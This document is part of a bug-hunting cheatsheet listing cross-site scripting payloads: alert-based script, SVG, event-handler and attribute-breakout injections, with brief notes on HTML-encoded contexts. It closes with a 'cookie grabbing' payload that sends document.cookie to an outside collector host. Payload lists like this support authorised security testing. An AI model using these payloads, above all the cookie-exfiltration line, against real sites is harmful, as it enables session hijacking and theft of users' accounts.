#### For testing.
```js
<script>alert(1337)</script>
<svg/ onload=alert(1337)//
<script onclick="alert(1337)">
" onclick="alert(1337)
" autofocus="alert(1337)
"onmouseover="alert(1)
">cyborg71<script>alert(1337)</script> >> DOM XSS in document.write sink using source location.search
<img src=x onerror=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt;
```
### Reflected XSS into attribute with angle brackets HTML-encoded
  Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)
  If this is the case, you should inject this payloads. 
```js
" onclick="alert(1337)
" autofocus="alert(1337)
" autofocus onfocus="alert(1337)
"onmouseover="alert(1)
```
### Reflected XSS into a JavaScript string with angle brackets HTML encoded
```js
<xss>'"
xss';alert(1);'xss
```
#### For cookie grabbing.
```js
<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
```
